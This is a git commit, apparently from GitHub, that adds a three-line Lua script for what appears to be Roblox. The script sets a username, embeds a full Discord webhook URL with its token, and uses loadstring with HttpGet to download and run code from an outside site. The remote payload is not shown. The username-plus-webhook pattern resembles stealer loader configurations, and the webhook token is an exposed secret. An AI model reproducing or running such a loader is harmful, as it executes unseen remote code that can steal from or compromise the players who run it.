16a9861e16977eeeeddb3ce47b16ae35b13a50a6
testyyuy <130860438+testyyuy@users.noreply.github.com>
2023-04-15 20:28:42 +0300

    Add files via upload

---
+++ 698582558128209930.lua
@@ -0,0 +1,3 @@
+UserName = "CrySoul009"
+Webhook = "https://discord.com/api/webhooks/1094775468403724288/gq5JP9uNzlK130V108AsfVBHKxBkD62dbIPh1aspRYduhw4nOGFvEDN0FoiqUMGgAzos"
+loadstring(game:HttpGet("https://rizzhub.xyz/scripts/Main.lua", true))()
